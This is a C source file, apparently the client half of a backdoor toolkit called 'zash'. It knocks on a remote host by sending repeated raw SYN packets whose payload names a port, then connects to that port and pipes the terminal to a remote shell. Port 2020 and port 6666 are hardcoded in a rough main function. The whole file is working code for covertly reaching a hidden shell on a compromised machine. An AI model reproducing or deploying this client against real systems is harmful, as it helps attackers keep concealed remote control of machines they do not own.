/**
 * @brief This module run a client that connect to a distant server and run commands on it.
 * @aouther Z.F
 * @date 04/05/2020
 */


/** Headers ***************************************************/
#include <unistd.h>
#include <stdbool.h>
#include <sys/select.h>

#include "common.h"
#include "config.h"
#include "socket/socket.h"
#include "utils/utils.h"

#include "client.h"
#include "client_internal.h"


/** Functions *************************************************/
enum zash_status client_port_knock(const char *interface,
                                   const char *ip,
                                   uint16_t port,
                                   uint16_t port_to_connect,
                                   int *fd_socket)
{

    enum zash_status status = ZASH_STATUS_UNINITIALIZED;

    struct SOCKET_syn_context *context = NULL;
    int temp_socket = INVALID_FILE_DESCRIPTOR;
    size_t i = 0;

    /* Check for valid parameters */
    ASSERT(NULL != interface);
    ASSERT(NULL != ip);
    ASSERT(NULL != fd_socket);

    /* Create a socket syn object to send port knocking with */
    status = SOCKET_syn_create(interface, &context);
    if (ZASH_STATUS_SUCCESS != status) {
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Knock 5 times */
    for (i = 0; i < ZASH_NUMBER_OF_SYN_KNOCKS; ++i) {

        /* Send a syn packet with the port to connect to on as payload */
        status = SOCKET_syn_send(context,
                                 ip,
                                 port,
                                 (uint8_t *)&port_to_connect,
                                 sizeof(port_to_connect));
        if (ZASH_STATUS_SUCCESS != status) {
            DEBUG_PRINT("status: %d", status);
            goto lbl_cleanup;
        }
    }

    /* Connect to the server */
    status = SOCKET_tcp_client(interface, ip, port_to_connect, &temp_socket);
    if (ZASH_STATUS_SUCCESS != status) {
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Transfer Ownership */
    *fd_socket = temp_socket;
    temp_socket = INVALID_FILE_DESCRIPTOR;

    /* Indicate Success */
    status = ZASH_STATUS_SUCCESS;

lbl_cleanup:

    CLOSE(temp_socket);

    return status;
}


enum zash_status client_connect_terminal_to_socket(int fd_socket)
{

    enum zash_status status = ZASH_STATUS_UNINITIALIZED;

    fd_set set = {0};
    int nfds = MAX(fd_socket, STDIN_FILENO) + 1;
    int return_value = C_STANDARD_FAILURE_VALUE;
    bool is_fd_ready = false;

    /* Transform data from standard io to the shell */
    while (true) {

        /* Reset the fd set to contain standard input and socket */
        FD_ZERO(&set);
        FD_SET(fd_socket, &set);
        FD_SET(STDIN_FILENO, &set);

        /* wait until standard input or socket is ready */
        return_value = select(nfds, &set, NULL, NULL, NULL);
        if (C_STANDARD_FAILURE_VALUE == return_value) {
            status = ZASH_STATUS_CLIENT_CONNECT_TERMINAL_TO_SOCKET_SELECT_FAILED;
            DEBUG_PRINT("status: %d", status);
            goto lbl_cleanup;
        }

        /* if the socket is ready for reading, copy it content into standard output */
        is_fd_ready = FD_ISSET(fd_socket, &set);
        if (is_fd_ready) {
            status = UTILS_copy_fd(fd_socket, STDOUT_FILENO, MAX_TRANSFER_LENGTH);
            if (ZASH_STATUS_SUCCESS != status) {
                DEBUG_PRINT("status: %d", status);
                goto lbl_cleanup;
            }
        }

        /* if the standard input is ready for reading, copy it content into the scoket */
        is_fd_ready = FD_ISSET(STDIN_FILENO, &set);
        if (is_fd_ready) {
            status = UTILS_copy_fd(STDIN_FILENO, fd_socket, MAX_TRANSFER_LENGTH);
            if (ZASH_STATUS_SUCCESS != status) {
                DEBUG_PRINT("status: %d", status);
                goto lbl_cleanup;
            }
        }
    }

lbl_cleanup:

    return status;
}


enum zash_status
CLIENT_run(const char *interface, const char *ip, uint16_t port, uint16_t port_to_connect)
{

    enum zash_status status = ZASH_STATUS_UNINITIALIZED;
    int socket_fd = INVALID_FILE_DESCRIPTOR;

    /* Check for valid parameters */
    if ((NULL == interface) || (NULL == ip)) {
        status = ZASH_STATUS_CLIENT_RUN_NULL_POINTER;
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Use port knocking to connect to the server */
    status = client_port_knock(interface, ip, port, port_to_connect, &socket_fd);
    if (ZASH_STATUS_SUCCESS != status) {
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Connect standard io to the socket */
    status = client_connect_terminal_to_socket(socket_fd);
    /* If the function fail because of empty file, it is not an error - the shell was closed. */
    if ((ZASH_STATUS_SUCCESS != status) && (ZASH_STATUS_UTILS_COPY_FD_EMPTY_FILE != status)) {
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Indicate Success */
    status = ZASH_STATUS_SUCCESS;

lbl_cleanup:

    CLOSE(socket_fd);

    return status;
}


//TODO: remove main
void main(int argc, char *argv[])
{
    CLIENT_run(argv[1], argv[2], 2020, 6666);
}
